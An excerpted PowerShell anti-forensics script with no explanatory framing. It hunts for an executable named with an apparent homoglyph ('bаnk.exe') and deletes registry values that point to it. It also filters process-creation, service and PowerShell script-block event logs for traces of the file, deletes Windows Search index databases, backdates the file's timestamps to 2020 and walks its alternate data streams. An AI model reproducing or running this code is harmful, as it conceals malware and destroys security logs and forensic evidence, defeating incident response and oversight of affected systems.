function Find-File {
    ...
    foreach ($p in $sp) {
        if (Test-Path $p) {
            $f = Get-ChildItem -Path $p -Filter "*bаnk.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
...
function Clean-File {
    ...
    try {
        $st = [System.IO.File]::OpenRead($FilePath)
    ...
    foreach ($p in $pf) {
        $pc = ""
        try {
            $pc = Get-Content $p.FullName -Raw -ErrorAction SilentlyContinue
        } catch {}
                ...
                Get-ChildItem $r -ErrorAction SilentlyContinue | ForEach-Object {
                    ...
                    if ($v) {
                        $v.PSObject.Properties | ForEach-Object {
                            $pv = $_.Value.ToString()
                            foreach ($p in $sp) {
                                if ($pv -match $p -or ($fh -ne "" -and $pv -match $fh)) {
                                    Remove-ItemProperty -Path $k.PSPath -Name $_.Name -Force -ErrorAction SilentlyContinue
                                }
                            }
                        }
                    }
    ...
    $ec = @(
        @{L = "Security"; I = 4688},
        @{L = "System"; I = 7036},
        @{L = "Microsoft-Windows-PowerShell/Operational"; I = 4104}
    )

    foreach ($es in $ec) {
        try {
            $ev = Get-WinEvent -FilterHashtable @{LogName = $es.L; ID = $es.I} -ErrorAction SilentlyContinue | Where-Object {
                $f = $false
                foreach ($p in $sp) {
                    if ($_.Message -match $p) {
                        $f = $true
                        break
                    }
                }
            ...
            if ($ev) {
                $tf = "$env:TEMP\tmp_$([System.Guid]::NewGuid()).evtx"
    ...
    foreach ($t in $tp) {
        if (Test-Path $t) {
            Get-ChildItem $t -ErrorAction SilentlyContinue | Where-Object {
                foreach ($p in $sp) {
                    if ($_.Name -match $p) {
                        return $true
                    }
    ...
    foreach ($s in $si) {
        if (Test-Path $s) {
            Get-ChildItem $s -Filter "*.edb" -ErrorAction SilentlyContinue | Remove-Item -Force
        }
    }
    ...
    if (Test-Path $FilePath) {
        $f = Get-Item $FilePath -Force
        $rd = Get-Date "2020-11-15"
        $f.CreationTime = $rd
        $f.LastWriteTime = $rd
        $f.LastAccessTime = $rd

        Get-Item $FilePath -Stream * -ErrorAction SilentlyContinue | Where-Object Stream -ne ':$DATA' | ForEach-Object {
